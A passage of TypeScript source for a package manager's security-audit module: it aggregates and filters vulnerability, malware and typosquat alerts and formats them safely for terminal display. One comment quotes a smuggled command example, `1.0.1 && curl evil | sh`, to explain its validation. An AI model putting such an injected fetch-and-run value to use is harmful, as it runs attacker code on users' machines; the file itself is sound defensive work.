import { styleText as utilStyleText } from 'node:util'
import {
  countDependencyPaths,
  getDependencyPaths,
  getDependents,
  isNode,
} from '@vltpkg/graph'
import { safeText, safeUrl } from './safe-text.ts'
import type { DepID } from '@vltpkg/dep-id'
import type { Dependent, Node } from '@vltpkg/graph'
import { parse, satisfies } from '@vltpkg/semver'
import type {
  Insights,
  LeveledInsights,
  SquatInsights,
} from '@vltpkg/query'
import type {
  AlertSeverity,
  PackageAlert,
} from '@vltpkg/security-archive'
import { isVulnerabilityAlert } from '@vltpkg/security-archive'

const styleText = (
  format: Parameters<typeof utilStyleText>[0],
  s: string,
) => utilStyleText(format, s, { validateStream: false })

/**
 * Detect if a DSS query string uses a security-related selector
 * (including lifecycle scripts, which can be security-relevant).
 */
export const isSecuritySelector = (query: string): boolean =>
  /:malware|:vuln|:vulnerable|:severity|:cve|:cwe|:squat|:scripts/.test(
    query,
  )

/**
 * Detect if a DSS query string uses a security selector that signals
 * genuine audit intent (malware, vulnerability, severity, squat, cve,
 * cwe). Unlike a check for `:scripts` alone -- listing packages with
 * lifecycle scripts is a legitimate query on its own and shouldn't by
 * itself be treated as a security audit (e.g. for deciding whether to
 * append a security-summary footer to query output).
 */
export const isSecurityAuditSelector = (query: string): boolean =>
  /:malware|:vuln|:vulnerable|:severity|:cve|:cwe|:squat/.test(query)

/**
 * Build a DSS query string from an audit level.
 *
 * `:vuln()`/`:severity()`/`:squat()` comparators operate on the query
 * engine's own numeric scale (critical=0 ... low=3, lower = more
 * severe; see src/query/src/pseudo/severity.ts, vuln.ts, squat.ts),
 * so "at or above" a given level is expressed as `<=` that level's
 * value, not `>`/`>=`. `:squat` only has two kinds (critical=0,
 * medium=2) -- there is no `:squat(high)`/`:squat(low)`.
 *
 * `:malware` is a binary selector (no parameters, always matches any
 * malware alert regardless of severity), so it must appear
 * unqualified at every level -- omitting it above `low` would drop
 * malware-only findings from the query entirely, not just from a
 * severity bucket. Use `:vuln` for comparator-based vulnerability
 * severity filtering instead.
 */
export const buildAuditQuery = (level: string): string => {
  // :scripts is deliberately excluded -- aggregateBySeverity has no
  // handling for lifecycle-script findings (no insights.scripts
  // bucket, no "scripts" category), so matches were fetched from the
  // DSS query and then silently discarded, doing work for no
  // user-visible output.
  const defaultQuery =
    ':malware, :vulnerable, :severity(<=low), :squat'
  const queries: Record<string, string> = {
    low: defaultQuery,
    medium:
      ':malware, :vuln(<=medium), :severity(<=medium), :squat(<=medium)',
    high: ':malware, :vuln(<=high), :severity(<=high), :squat(critical)',
    critical:
      ':malware, :vuln(critical), :severity(critical), :squat(critical)',
  }
  return queries[level] ?? defaultQuery
}

export type AuditPackage = {
  name: string
  version: string
  /** Structured alerts with detailed advisory information from SecurityArchive */
  alerts: PackageAlert[]
  /** CVE ids associated with this package's known vulnerabilities. */
  cves: string[]
  direct: boolean
  /**
   * A single representative dependency path (e.g.
   * "pkg-a > pkg-b > pkg-c"), for the common case of a package reached
   * exactly one way.
   */
  path?: string
  /**
   * How many distinct routes reach this package. A shared package is
   * usually reached more than one way, and each is a separate thing to
   * fix -- but listing them all buries the finding, so the summary
   * reports the number.
   */
  pathCount?: number
  /**
   * True when `pathCount` is a floor rather than the total, because
   * counting hit its bound. Render as `N+`, never as `N`.
   */
  pathCountTruncated?: boolean
  /**
   * The packages depending on this one and the range each declares.
   * Used to tell whether a patched version is already reachable
   * without any dependent having to change.
   */
  dependents?: Dependent[]
}

export type AuditResult = {
  summary: {
    critical: AuditPackage[]
    high: AuditPackage[]
    medium: AuditPackage[]
    low: AuditPackage[]
  }
  total: number
  directCount: number
  indirectCount: number
  /** Number of packages scanned (with security data available) */
  scannedCount?: number
  /** Number of packages without security data */
  unscannedCount?: number
}

export type SeverityLevel = 'critical' | 'high' | 'medium' | 'low'

/**
 * Severity levels in display order, most severe first.
 */
export const severityOrder: SeverityLevel[] = [
  'critical',
  'high',
  'medium',
  'low',
]

/**
 * Build an empty `AuditResult['summary']` (no findings in any bucket).
 */
export const emptySummary = (): AuditResult['summary'] => ({
  critical: [],
  high: [],
  medium: [],
  low: [],
})

/**
 * Build an empty `AuditResult` (no findings, zeroed counts).
 */
export const emptyAuditResult = (): AuditResult => ({
  summary: emptySummary(),
  total: 0,
  directCount: 0,
  indirectCount: 0,
})

// lower number = more severe, matching kindLevelMap in
// src/query/src/pseudo/severity.ts
const severityRank: Record<SeverityLevel, number> = {
  critical: 0,
  high: 1,
  medium: 2,
  low: 3,
}

/**
 * Normalize an alert's severity onto our four levels. The upstream
 * feed reports `middle` where we say `medium`; left untranslated it
 * matches no rank, so `maxSeverity` ignored it and a package whose
 * worst finding was `middle` was filed under `low`.
 */
const asSeverityLevel = (
  severity: string | undefined,
): SeverityLevel | undefined => {
  if (severity === undefined) return undefined
  const normalized = severity === 'middle' ? 'medium' : severity
  return normalized in severityRank ?
      (normalized as SeverityLevel)
    : undefined
}

const maxSeverity = (
  a: SeverityLevel,
  b: SeverityLevel,
): SeverityLevel => (severityRank[a] <= severityRank[b] ? a : b)

/**
 * Alert types that mean malware, matching the set the `:malware`
 * selector uses in `src/query/src/pseudo/malware.ts`.
 */
const malwareAlertTypes = new Set<string>(['malware', 'gptMalware'])

/**
 * Readable labels for the upstream alert types. The feed's own names
 * are API vocabulary -- `urlStrings`, `gptDidYouMean`,
 * `explicitlyUnlicensedItem` -- which tell a reader coming from `npm
 * audit` or `pnpm audit` nothing about what was found. Anything absent
 * from this table falls back to its raw type, so a newly added
 * upstream alert still reports rather than vanishing.
 */
const alertLabels: Record<string, string> = {
  // vulnerabilities. The feed grades CVEs by name -- mildCVE,
  // mediumCVE, cve, criticalCVE -- but the alert's own `severity`
  // field already carries that, so they all read "vulnerability"
  // rather than repeating the level twice on one line.
  cve: 'vulnerability',
  mildCVE: 'vulnerability',
  mediumCVE: 'vulnerability',
  highCVE: 'vulnerability',
  criticalCVE: 'vulnerability',
  potentialVulnerability: 'vulnerability',
  vulnerability: 'vulnerability',
  severity: 'vulnerability',
  gptSecurity: 'possible vulnerability (AI-flagged)',
  gptAnomaly: 'code anomaly (AI-flagged)',
  // malware and impersonation
  malware: 'malware',
  gptMalware: 'malware (AI-flagged)',
  didYouMean: 'possible typosquat',
  gptDidYouMean: 'possible typosquat (AI-flagged)',
  squatting: 'possible typosquat',
  troll: 'troll package',
  // maintenance and provenance
  deprecated: 'deprecated',
  unmaintained: 'unmaintained',
  missingAuthor: 'no author',
  newAuthor: 'new author',
  unstableOwnership: 'unstable ownership',
  trivialPackage: 'trivial package',
  unpopularPackage: 'unpopular package',
  suspiciousStarActivity: 'suspicious star activity',
  manifestConfusion: 'manifest mismatch',
  shrinkwrap: 'bundled shrinkwrap',
  // licensing
  explicitlyUnlicensedItem: 'unlicensed',
  noLicenseFound: 'no license',
  nonpermissiveLicense: 'restrictive license',
  copyleftLicense: 'copyleft license',
  miscLicenseIssues: 'license issue',
  ambiguousClassifier: 'ambiguous license',
  unidentifiedLicense: 'unrecognized license',
  licenseException: 'license exception',
  // what the code does at install or run time
  installScripts: 'install script',
  usesEval: 'uses eval',
  dynamicRequire: 'dynamic require',
  networkAccess: 'network access',
  shellAccess: 'shell access',
  filesystemAccess: 'filesystem access',
  envVars: 'reads environment variables',
  debugAccess: 'debug code',
  hasNativeCode: 'native code',
  telemetry: 'telemetry',
  obfuscatedFile: 'obfuscated code',
  minifiedFile: 'minified code',
  highEntropyStrings: 'possible hardcoded secret',
  urlStrings: 'embedded URL',
}

const alertLabel = (type: string): string => alertLabels[type] ?? type

/**
 * Typeguard for a node exposing an `edgesOut` map -- used to precompute
 * an importer's direct dependencies. `edgesOut` is bounded by that
 * importer's own declared dependencies, unlike a dependency's
 * `edgesIn` which grows with however many packages in the whole graph
 * depend on it.
 */
const isNodeWithEdgesOut = (
  o: unknown,
): o is Node & {
  edgesOut: { values: () => Iterable<{ to?: { id: string } }> }
} => isNode(o) && 'edgesOut' in o

/**
 * Typeguard for a graph node carrying an `insights` object.
 */
const isNodeWithInsights = (
  o: unknown,
): o is Node & {
  id: string
  insights: Insights
} =>
  isNode(o) &&
  'insights' in o &&
  typeof (o as { insights: unknown }).insights === 'object' &&
  (o as { insights: unknown }).insights !== null

/**
 * Runtime typeguard for `LeveledInsights` (malware, severity, vuln).
 * The type comes from `@vltpkg/query`; the check is still needed
 * because insights reach us as untrusted data off a query result.
 */
const isLeveledInsights = (o: unknown): o is LeveledInsights =>
  typeof o === 'object' &&
  o !== null &&
  'low' in o &&
  'medium' in o &&
  'high' in o &&
  'critical' in o &&
  typeof (o as { low: unknown }).low === 'boolean' &&
  typeof (o as { medium: unknown }).medium === 'boolean' &&
  typeof (o as { high: unknown }).high === 'boolean' &&
  typeof (o as { critical: unknown }).critical === 'boolean'

/**
 * Runtime typeguard for `SquatInsights` from `@vltpkg/query`.
 */
const isSquatInsights = (o: unknown): o is SquatInsights =>
  typeof o === 'object' &&
  o !== null &&
  'medium' in o &&
  'critical' in o &&
  typeof (o as { medium: unknown }).medium === 'boolean' &&
  typeof (o as { critical: unknown }).critical === 'boolean'

/**
 * Determine the highest severity level from leveled insights.
 */
const getLeveledSeverity = (
  insights: LeveledInsights,
): SeverityLevel | null => {
  if (insights.critical) return 'critical'
  if (insights.high) return 'high'
  if (insights.medium) return 'medium'
  if (insights.low) return 'low'
  return null
}

/**
 * Determine severity from squat insights.
 */
const getSquatSeverity = (
  insights: SquatInsights,
): SeverityLevel | null => {
  if (insights.critical) return 'critical'
  if (insights.medium) return 'medium'
  return null
}

/**
 * Our internal level in the feed's own spelling, for use on a synthetic
 * `PackageAlert`.
 *
 * A synthetic alert has to be shaped exactly as a real one would be --
 * see the category note below -- and the wire scale says `middle` where
 * ours says `medium`. Emitting `medium` here would put a value on a
 * `PackageAlert` that the endpoint never produces.
 */
const toWireSeverity = (level: SeverityLevel): AlertSeverity =>
  level === 'medium' ? 'middle' : level

/**
 * Helper to construct synthetic PackageAlert objects from insights.
 * Used as fallback when SecurityArchive doesn't have detailed alert data.
 */
const constructSyntheticAlerts = (insights: {
  malware?: unknown
  severity?: unknown
  squat?: unknown
  vuln?: unknown
}): PackageAlert[] => {
  const alerts: PackageAlert[] = []

  // Categories match the feed's own taxonomy: malware and typosquatting
  // are `supplyChainRisk` types, not categories of their own, so a
  // synthetic alert has to be filed the same way a real one would be or
  // classification of the two disagrees.
  if (insights.malware && isLeveledInsights(insights.malware)) {
    const s = getLeveledSeverity(insights.malware)
    if (s) {
      alerts.push({
        key: `malware-${s}`,
        type: 'malware',
        category: 'supplyChainRisk',
        severity: toWireSeverity(s),
      })
    }
  }

  if (insights.squat && isSquatInsights(insights.squat)) {
    const s = getSquatSeverity(insights.squat)
    if (s) {
      alerts.push({
        key: `squat-${s}`,
        type: 'squatting',
        category: 'supplyChainRisk',
        severity: toWireSeverity(s),
      })
    }
  }

  // `severity` and `vuln` describe the same CVE data -- `vuln`'s alert
  // types are a superset of `severity`'s, so one CVE sets both. Emitting
  // an alert per insight would report a single vulnerability twice: two
  // rows collapsing to `vulnerability: high x2`, and two increments of
  // the vulnerable count. Take the worse of the two levels and emit one.
  const severityLevel =
    insights.severity && isLeveledInsights(insights.severity) ?
      getLeveledSeverity(insights.severity)
    : null
  const vulnLevel =
    insights.vuln && isLeveledInsights(insights.vuln) ?
      getLeveledSeverity(insights.vuln)
    : null
  const worstVuln =
    severityLevel && vulnLevel ?
      maxSeverity(severityLevel, vulnLevel)
    : (severityLevel ?? vulnLevel)
  if (worstVuln) {
    alerts.push({
      key: `vuln-${worstVuln}`,
      type: 'vulnerability',
      category: 'vulnerability',
      severity: toWireSeverity(worstVuln),
    })
  }

  return alerts
}

/**
 * Whether an alert is worth reporting at all.
 *
 * The feed attaches its own policy verdict to each alert -- `error`,
 * `warn`, `monitor`, `ignore` -- and `ignore` accounts for the large
 * majority of them (things like `envVars` and `networkAccess` on
 * ordinary packages). Reporting those buries the findings that matter
 * under noise the feed has already judged to be noise.
 *
 * Filtered here, at the single point alerts enter, so severity
 * bucketing, the counts and the rendered rows cannot disagree about
 * which alerts exist. A package whose every alert is ignored ends up
 * with none and drops out of the report entirely, which is the intent.
 *
 * Synthetic alerts carry no `action` and so are always reportable.
 */
const isReportable = (alert: PackageAlert): boolean =>
  alert.action !== 'ignore'

/**
 * The only part of a security archive this module uses: a lookup by
 * `DepID`. Structural rather than `SecurityArchiveLike` so a bare
 * lookup object is enough (nothing here sets, deletes or clears), and
 * keyed by `DepID` -- the key type a real `SecurityArchive` accepts --
 * so both an actual archive and a plain `{ get }` stand-in satisfy it.
 * The result is `unknown` because a stand-in makes no promise about
 * the shape; `getPackageAlerts` validates it before use.
 */
export type SecurityArchiveLookup = {
  get?: (depId: DepID) => unknown
}

/**
 * Helper to look up PackageAlert from SecurityArchive for a node.
 * Falls back to constructing alerts from insights if archive has no data.
 * Returns an array of relevant alerts for the node's package.
 */
const getPackageAlerts = (
  node: { id?: DepID; insights: object },
  securityArchive?: SecurityArchiveLookup,
): PackageAlert[] => {
  if (securityArchive?.get && node.id) {
    const reportData = securityArchive.get(node.id)
    if (
      typeof reportData === 'object' &&
      reportData !== null &&
      'alerts' in reportData &&
      Array.isArray(reportData.alerts)
    ) {
      return (
        (reportData as { alerts: unknown[] }).alerts as PackageAlert[]
      ).filter(isReportable)
    }
  }

  // An archive miss falls through to synthesizing from insights, which
  // the caller's `isNodeWithInsights` guarantees is a non-null object.
  return constructSyntheticAlerts(node.insights)
}

/**
 * Report insight categories that are present on a node but don't match
 * the expected shape. Absent categories are silently skipped -- only a
 * present-but-malformed one is worth telling the user about, since it
 * means findings are being dropped from the audit.
 */
const warnMalformedInsights = (
  insights: {
    malware?: unknown
    severity?: unknown
    squat?: unknown
    vuln?: unknown
  },
  id: string,
  warn: (message: string) => void,
): void => {
  const malformed = (category: string) =>
    warn(`ignoring malformed ${category} insights for ${id}`)

  if (insights.malware && !isLeveledInsights(insights.malware)) {
    malformed('malware')
  }
  if (insights.severity && !isLeveledInsights(insights.severity)) {
    malformed('severity')
  }
  if (insights.squat && !isSquatInsights(insights.squat)) {
    malformed('squat')
  }
  if (insights.vuln && !isLeveledInsights(insights.vuln)) {
    malformed('vuln')
  }
}

/**
 * Aggregate query results by severity for audit output. `warn`, if
 * provided, is called for nodes whose insights data is present but
 * does not match the expected shape (as opposed to simply absent).
 *
 * When securityArchive is provided, populates alerts with full
 * PackageAlert objects including advisory details (CVE, CWE, etc).
 */
export const aggregateBySeverity = (
  nodes: Iterable<unknown>,
  importers: Set<unknown>,
  warn: (message: string) => void = () => {},
  securityArchive?: SecurityArchiveLookup,
): AuditResult => {
  const result: AuditResult = emptyAuditResult()

  // Precompute importer ids and their direct dependencies from the
  // importers' own `edgesOut` (bounded by what each importer declares
  // in its package.json). This is cheaper than checking, per flagged
  // node, whether any of that node's `edgesIn` comes from an
  // importer -- `edgesIn` grows with how many packages in the whole
  // graph depend on that node, which for a popular/shared package can
  // be large.
  const importerIds = new Set<string>()
  const directDepIds = new Set<string>()
  for (const imp of importers) {
    if (!isNode(imp)) continue
    importerIds.add(imp.id)
    if (isNodeWithEdgesOut(imp)) {
      for (const edge of imp.edgesOut.values()) {
        if (edge.to) directDepIds.add(edge.to.id)
      }
    }
  }

  for (const node of nodes) {
    if (!isNodeWithInsights(node)) continue

    const insights = node.insights

    warnMalformedInsights(insights, node.id, warn)

    // Prefer the structured alerts from securityArchive, which carry
    // full advisory detail (CVE, CWE, ...). `getPackageAlerts` falls
    // back to synthesizing alerts from insights when the archive has
    // no entry -- and must be called even when no archive was passed
    // at all, since `vlt query`'s security footer
    // (commands/query.ts) aggregates without one.
    const alerts: PackageAlert[] = getPackageAlerts(
      node,
      securityArchive,
    )

    if (alerts.length === 0) continue

    // Compute max severity from alert data.
    //
    // An alert whose severity we don't recognize must not fall through
    // to the 'low' default: `--audit-level=high` then drops the whole
    // package and the command exits 0, so a feed that spells a malware
    // alert's severity `moderate` or `CRITICAL` would silently hide it.
    // Unrecognized severities are reported, and malware -- which is
    // severe whatever the feed says -- is treated as critical.
    // Seeded at the bottom of the scale: every level is >= 'low', so
    // folding from there yields the worst of the alerts.
    let newSeverity: SeverityLevel = 'low'
    for (const alert of alerts) {
      const level = asSeverityLevel(alert.severity)
      if (level) {
        newSeverity = maxSeverity(newSeverity, level)
        continue
      }
      const fallback: SeverityLevel =
        malwareAlertTypes.has(alert.type) ? 'critical' : 'low'
      warn(
        `treating unrecognized severity ${JSON.stringify(safeText(alert.severity, 32))} on ${safeText(alert.type, 64)} alert for ${node.id} as ${fallback}`,
      )
      newSeverity = maxSeverity(newSeverity, fallback)
    }

    // Direct dependency: the node itself is an importer (e.g. a
    // workspace root with its own findings), or it's one of the
    // importers' declared direct dependencies.
    const direct =
      importerIds.has(node.id) || directDepIds.has(node.id)

    const pathCount = countDependencyPaths(node)

    const pkg: AuditPackage = {
      // both come from a package's own manifest and are rendered, so
      // they are scrubbed like any other untrusted string
      name: safeText(node.name, 128) || 'unknown',
      version: safeText(node.version, 64) || 'unknown',
      alerts,
      cves: Array.isArray(insights.cve) ? insights.cve : [],
      direct,
      // one representative route for context, plus how many there are
      // in total -- `vlt audit` reports the count and leaves listing
      // every route to a dedicated command
      path: getDependencyPaths(node, { maxPaths: 1 }).paths[0],
      pathCount: pathCount.count,
      pathCountTruncated: pathCount.truncated,
      dependents: getDependents(node),
    }

    // Verify newSeverity is a valid key before using it
    if (newSeverity in result.summary) {
      result.summary[newSeverity].push(pkg)
      result.total++
      if (direct) result.directCount++
      else result.indirectCount++
    }
  }

  return result
}

/**
 * Filter audit results to only include severities at or above the
 * minimum. `directCount`/`indirectCount` are recomputed from the
 * filtered packages, so the direct/transitive footer always matches
 * the issues actually shown, not the pre-filter totals.
 */
/**
 * How many installed versions the feed had security data for.
 *
 * MUST be counted over every node in the graph rather than over the
 * audit's own results: a flagged package by definition had data, so
 * counting the results reports near-total coverage whatever the truth,
 * and hides the versions nothing is known about.
 *
 * Counted per node, so the unit is installed versions -- two versions of
 * one package are two things to have scanned.
 */
export const scanCoverage = (
  nodes: Iterable<unknown>,
): { scanned: number; unscanned: number } => {
  let scanned = 0
  let unscanned = 0
  for (const node of nodes) {
    if (!isNode(node) || !('insights' in node)) continue
    const insights = (node as { insights: unknown }).insights
    if (
      typeof insights !== 'object' ||
      insights === null ||
      !('scanned' in insights)
    ) {
      continue
    }
    if (insights.scanned) scanned++
    else unscanned++
  }
  return { scanned, unscanned }
}

export const filterAuditResult = (
  result: AuditResult,
  minSeverity: SeverityLevel,
): AuditResult => {
  const minRank = severityRank[minSeverity]
  const filtered: AuditResult = emptyAuditResult()
  // scan coverage describes the graph, not the findings, so it survives
  // filtering unchanged -- dropping it left formatAuditSummary's check
  // for it always false, so the coverage line never rendered at all
  filtered.scannedCount = result.scannedCount
  filtered.unscannedCount = result.unscannedCount
  for (const sev of severityOrder) {
    const belowThreshold = severityRank[sev] > minRank
    // A finding the feed reports as actively exploited survives the
    // threshold. Its severity is left exactly as graded -- we don't
    // second-guess the feed -- but dropping it would let a CI gate on
    // --audit-level=critical silently discard a vulnerability that is
    // being exploited right now.
    const pkgs =
      belowThreshold ?
        result.summary[sev].filter(isPackageActivelyExploited)
      : result.summary[sev]
    if (pkgs.length === 0) continue
    filtered.summary[sev] = pkgs
    filtered.total += pkgs.length
    for (const pkg of pkgs) {
      if (pkg.direct) filtered.directCount++
      else filtered.indirectCount++
    }
  }
  return filtered
}

/**
 * Whether the feed reports this alert as being exploited in the wild --
 * a CISA Known Exploited Vulnerabilities entry.
 *
 * `kevs` arrives through `PackageAlertProps`' index signature, so it is
 * checked at runtime. A non-empty array is the signal, whatever its
 * entries hold, so this doesn't depend on an element shape.
 */
const isActivelyExploited = (alert: PackageAlert): boolean => {
  const kevs = alert.props?.kevs
  return Array.isArray(kevs) && kevs.length > 0
}

/** Whether any of a package's findings is actively exploited. */
const isPackageActivelyExploited = (pkg: AuditPackage): boolean =>
  pkg.alerts.some(isActivelyExploited)

/**
 * How many packages carry an actively exploited finding.
 */
export const activelyExploitedCount = (
  result: AuditResult,
): number => {
  let count = 0
  for (const pkgs of Object.values(result.summary)) {
    for (const pkg of pkgs) {
      if (isPackageActivelyExploited(pkg)) count++
    }
  }
  return count
}

const severityFormat: Record<
  SeverityLevel,
  Parameters<typeof utilStyleText>[0]
> = {
  critical: 'redBright',
  high: 'red',
  medium: 'yellow',
  low: 'dim',
}

/**
 * Style `text` with the conventional color for `severity`, when
 * `colors` is true.
 */
const colorizeBySeverity = (
  severity: SeverityLevel,
  text: string,
  colors?: boolean,
): string =>
  colors ? styleText(severityFormat[severity], text) : text

// Deliberately distinct from severityFormat's reds/yellows -- these
// label alert type (what kind of finding), not severity (how bad),
// so reusing the severity palette here would read as a severity cue.
const categoryFormat: Record<
  keyof CategoryCounts,
  Parameters<typeof utilStyleText>[0]
> = {
  malware: 'magenta',
  vulnerable: 'cyan',
  squat: 'blue',
}

/**
 * Style `text` with the conventional color for `category`, when
 * `colors` is true.
 */
const colorizeByCategory = (
  category: keyof CategoryCounts,
  text: string,
  colors?: boolean,
): string =>
  colors ? styleText(categoryFormat[category], text) : text

/**
 * Format a severity bucket heading (e.g. "critical (2)"), styled with
 * the conventional severity color when `colors` is true. Shared by
 * any view that renders a severity breakdown (e.g. `vlt query`'s
 * security-summary footer).
 */
export const formatSeverityHeading = (
  severity: SeverityLevel,
  count: number,
  colors?: boolean,
): string =>
  colorizeBySeverity(severity, `${severity} (${count})`, colors)

/**
 * Return the non-empty severity buckets of an audit result, in
 * `severityOrder` (most severe first). Shared by any view that needs
 * to render a severity breakdown (e.g. `vlt audit`'s human view and
 * `vlt query`'s security-summary footer).
 */
export const nonEmptySeverityBuckets = (
  result: AuditResult,
): { severity: SeverityLevel; pkgs: AuditPackage[] }[] =>
  severityOrder
    .map(severity => ({ severity, pkgs: result.summary[severity] }))
    .filter(({ pkgs }) => pkgs.length > 0)

export type CategoryCounts = {
  malware: number
  vulnerable: number
  squat: number
}

/**
 * Count *packages* by category (malware, vulnerable, squat) across an
 * audit result. A package with alerts in more than one category
 * contributes once to each, so these don't necessarily sum to
 * `result.total`, but no package is ever counted twice within one
 * category.
 *
 * Deliberately packages rather than alerts. These render directly above
 * the per-severity line, which counts packages, and a reader takes two
 * adjacent count lines to be in the same unit -- reporting `26
 * vulnerable` beside `7 high, 7 low` for fourteen packages reads as
 * twenty-six vulnerable packages. Counting alerts also multiplied a
 * single finding: one CVE sets both `insights.severity` and
 * `insights.vuln`, so the synthetic path emits two alerts for it.
 */
export const categoryCounts = (
  result: AuditResult,
): CategoryCounts => {
  const counts: CategoryCounts = {
    malware: 0,
    vulnerable: 0,
    squat: 0,
  }
  // Malware is matched on `type` first, not `category`: the feed files
  // malware under a supply-chain category, so keying on category alone
  // counted it nowhere -- the detail rows read "malware: critical"
  // while the headline said zero. Everything else classifies on
  // `category` with `type` as the fallback, since mixing the two fields
  // per-branch let a `severity` alert match none of them.
  for (const pkgs of Object.values(result.summary)) {
    for (const pkg of pkgs) {
      const seen = new Set<keyof CategoryCounts>()
      for (const alert of pkg.alerts) {
        // Malware and typosquatting are distinguishable only by `type`
        // -- both sit in the `supplyChainRisk` category alongside every
        // capability finding, so category alone cannot separate them.
        if (malwareAlertTypes.has(alert.type)) {
          seen.add('malware')
        } else if (impersonationAlertTypes.has(alert.type)) {
          seen.add('squat')
        } else if (
          alert.category === 'vulnerability' ||
          isVulnerabilityAlert(alert)
        ) {
          seen.add('vulnerable')
        }
      }
      for (const category of seen) counts[category]++
    }
  }
  return counts
}

/**
 * Format the "N direct dependency/dependencies, M transitive"
 * breakdown line shared by `formatAuditSummary` and `vlt query`'s
 * security-summary footer.
 */
export const formatDependencyBreakdown = (
  result: AuditResult,
): string => {
  const directWord =
    result.directCount === 1 ? 'dependency' : 'dependencies'
  return `${result.directCount} direct ${directWord}, ${result.indirectCount} transitive`
}

/**
 * NVD's vulnerability detail page for a CVE id -- a stable, publicly
 * documented URL scheme, not something specific to this package.
 */
const nvdUrl = (cve: string): string =>
  `https://nvd.nist.gov/vuln/detail/${cve}`

/**
 * MITRE's CWE definition page for a CWE id.
 */
const cweUrl = (cweId: string): string => {
  // Extract numeric ID from "CWE-1234" format
  const id = cweId.replace(/^CWE-/, '')
  return `https://cwe.mitre.org/data/definitions/${id}.html`
}

/**
 * Render `text` as a clickable OSC 8 terminal hyperlink to `url` when
 * `enabled`, matching the pattern in `@vltpkg/url-open`. Terminals
 * that don't support OSC 8 just show `text`, so this only degrades
 * gracefully when `enabled` is backed by real TTY detection --
 * otherwise fall back to printing the URL alongside the text, since
 * a hidden link is useless in piped/non-interactive output.
 */
const hyperlink = (
  text: string,
  url: string,
  enabled?: boolean,
): string => {
  // `url` is interpolated into an escape sequence, so an unscrubbed
  // ESC or BEL in it terminates the hyperlink early and lets the
  // remainder execute as fresh terminal instructions. The
  // non-enabled branch is no safer -- it only defers those bytes
  // until the output is read back. A non-http(s) url is dropped
  // rather than handed to the OS opener behind a harmless label.
  const label = safeText(text, 128)
  const href = safeUrl(url)
  // Every call site either builds an https URL itself or, as in
  // `advisoryLink`, has already run `safeUrl`.
  /* c8 ignore next - no call site can currently supply a bad url */
  if (!href) return label
  // underline the label so it reads as a link even in terminals that
  // render OSC 8 without an affordance of their own
  const shown = enabled ? styleText('underline', label) : label
  return enabled ?
      `]8;;${href}\\${shown}]8;;\\`
    : `${label} (${href})`
}

/**
 * The advisory ids carried on a single alert's own props, as links.
 * Rendering these on the alert's own line is what keeps "which CVE
 * belongs to which finding" legible -- a flat per-package list of ids
 * loses that association as soon as a package has two alerts.
 */
const alertRefs = (
  alert: PackageAlert,
  colors?: boolean,
): string[] => {
  const refs: string[] = []
  // every id here is feed-supplied and goes both into visible text and
  // into a URL, so scrub before either use
  const cveId = safeText(alert.props?.cveId, 64)
  if (cveId) refs.push(hyperlink(cveId, nvdUrl(cveId), colors))
  const advisory = advisoryLink(alert, colors)
  if (advisory) refs.push(advisory)
  const score = alert.props?.cvss?.score
  if (typeof score === 'number' && Number.isFinite(score)) {
    refs.push(`CVSS ${score}`)
  }
  for (const cwe of alert.props?.cwes ?? []) {
    const id = safeText(cwe.id, 64)
    if (id) refs.push(hyperlink(id, cweUrl(id), colors))
  }
  // A CISA KEV entry means this is being exploited in the wild, which
  // outranks the CVSS score when deciding what to patch first.
  if (isActivelyExploited(alert)) {
    refs.push(
      colors ?
        styleText(['red', 'bold'], 'actively exploited')
      : 'actively exploited',
    )
  }
  return refs
}

/**
 * A link to the advisory's own page. Socket supplies `url` directly on
 * most vulnerability alerts; `ghsaId` is the fallback, since a GHSA id
 * maps onto a stable github.com/advisories URL. Both arrive through
 * `PackageAlertProps`' index signature, hence the runtime checks.
 */
const advisoryLink = (
  alert: PackageAlert,
  colors?: boolean,
): string | undefined => {
  const id = safeText(alert.props?.ghsaId, 64)
  // A GHSA id is ours to turn into a URL, so labelling that link with
  // the id is honest. A feed-supplied `url` is not: labelling it with
  // the id would let an entry show a trustworthy-looking advisory id
  // over a link to somewhere else entirely, which the reader cannot
  // see before clicking. So show the host it actually goes to.
  if (id) {
    return hyperlink(
      id,
      `https://github.com/advisories/${id}`,
      colors,
    )
  }
  const href = safeUrl(alert.props?.url)
  if (!href) return undefined
  return hyperlink(new URL(href).host, href, colors)
}

/**
 * An alert's advisory summary, as separate lines: the title, then the
 * affected range and the first version that fixes it. The version info
 * gets its own line because a `vulnerableVersionRange` is routinely a
 * multi-clause string, and appending it to the title pushes both past
 * the width of a terminal.
 *
 * Deliberately excludes `props.description` -- it runs to paragraphs
 * and belongs on the linked advisory page, not in a terminal summary.
 */
const alertAdvisoryLines = (alert: PackageAlert): string[] => {
  const lines: string[] = []
  const title = safeText(alert.props?.title, 200)
  if (title) lines.push(title)

  const versions: string[] = []
  const range = safeText(alert.props?.vulnerableVersionRange, 200)
  if (range) versions.push(`affects ${range}`)
  const fixed = patchedVersion(alert)
  if (fixed) versions.push(`patched in ${fixed}`)
  if (versions.length > 0) lines.push(versions.join(' -- '))

  return lines
}

/**
 * The alert's patched version, but only if it really is a version.
 *
 * This string ends up in a command the reader is invited to copy and
 * paste, so it has to parse as semver -- `1.0.1 && curl evil | sh` is a
 * plausible feed value and must not become a suggested shell command.
 */
const patchedVersion = (alert: PackageAlert): string | undefined => {
  const fixed = alert.props?.firstPatchedVersionIdentifier
  if (typeof fixed !== 'string' || !fixed) return undefined
  return parse(fixed) ? fixed : undefined
}

/**
 * npm's package-name grammar. `pkg.name` comes from a tarball's own
 * manifest, and is likewise interpolated into a copy-pasteable command.
 */
const validPackageName =
  /^(?:@[a-z0-9-~][a-z0-9-._~]*\/)?[a-z0-9-~][a-z0-9-._~]*$/

/**
 * Whether a transitive package's patched version is already admitted
 * by the ranges its dependents declare.
 *
 * This is answerable from the local graph: a dependent that asks for
 * `^1.1.7` will resolve to a patched `1.1.17` on the next install,
 * while one pinning `1.1.16` has to widen its range first. Dependents
 * whose specifier carries no range (git, file, workspace) are reported
 * as indeterminate rather than counted either way -- their range says
 * nothing about which published versions are acceptable.
 */
const reachabilityLine = (
  pkg: AuditPackage,
  patched: string,
): string[] => {
  const dependents = pkg.dependents ?? []
  if (dependents.length === 0) return []

  const ranged: { name: string; range: string }[] = []
  for (const d of dependents) {
    if (d.range !== undefined) {
      ranged.push({ name: d.name, range: d.range })
    }
  }
  if (ranged.length === 0) {
    return [
      `patched in ${patched}; its dependents declare no version range`,
    ]
  }

  const blocked = ranged.filter(d => !satisfies(patched, d.range))
  if (blocked.length === 0) {
    const [first] = ranged
    const via =
      ranged.length === 1 && first ?
        `${first.name} declares ${first.range}`
      : `all ${ranged.length} dependents' ranges allow it`
    return [
